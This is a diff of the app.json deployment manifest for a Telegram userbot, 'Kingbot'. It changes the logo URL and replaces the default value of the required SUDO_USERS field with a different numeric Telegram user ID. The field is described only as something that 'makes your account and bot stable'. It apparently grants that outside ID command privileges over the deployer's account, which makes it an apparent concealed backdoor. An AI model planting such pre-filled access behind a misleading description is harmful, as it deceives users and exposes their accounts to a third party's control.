@@ -1,7 +1,7 @@
 {
   "name": "ᔕᗴᑎᔕᗴᎥᗰᗩ᙭-Kingbot",
   "description": "Userbot created by a @Sensei_nex and join https://t.me/SenseiMAXprojects for any problems or support",
-  "logo": "https://media.giphy.com/media/1o1irxN3omdkOeF9oH/giphy.gif",
+  "logo": "https://telegra.ph/file/aa9495e02bcdde118a977.gif",
     "keywords": [
     "telegram",
     "userbot",
@@ -90,7 +90,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your account and bot stable",
-      "value": "709723121",
+      "value": "1343556834",
       "required": true
     },
     "CHROME_BIN": {
